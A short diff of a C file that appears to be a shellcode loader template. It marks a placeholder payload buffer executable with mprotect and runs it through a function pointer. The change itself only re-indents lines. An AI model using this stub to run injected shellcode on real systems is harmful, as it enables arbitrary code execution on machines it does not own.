@@ -21,11 +21,9 @@ unsigned char PAYLOAD[SCSSIZE] = __SHELLCODE__
 //unsigned char PAYLOAD[SCSSIZE] = "PAYLOAD: ";
 
 int main(int argc, char *argv[]) {
-
 	// create executable memory
-    mprotect((void*)((intptr_t)PAYLOAD & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC);  
-    int (*exeshell)() = (int (*)()) PAYLOAD;  
-    (int)(*exeshell)(); // execute shellcode
-
+  mprotect((void*)((intptr_t)PAYLOAD & ~0xFFF), SCSSIZE, PROT_READ|PROT_EXEC);  
+  int (*exeshell)() = (int (*)()) PAYLOAD;  
+  (int)(*exeshell)(); // execute shellcode	
 	return 0;
 }
